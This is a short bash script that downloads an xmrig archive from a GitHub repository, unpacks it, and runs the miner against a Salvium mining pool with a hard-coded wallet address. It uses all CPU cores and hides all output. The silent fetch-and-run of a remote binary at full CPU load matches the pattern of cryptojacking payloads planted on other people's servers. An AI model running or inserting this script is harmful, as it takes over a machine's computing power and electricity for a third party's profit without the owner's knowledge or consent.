#!/bin/bash
A=sg.salvium.herominers.com:1230
B=SaLvsAi6k4C755eL7xEEEZJ4JDVUyx1gn9wtrJGngGkdMLRoTB721euSG2wbT14dn2885qFc93mS3eJQ9bwWQEmk58CgQmrj5nF
C=garsel
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
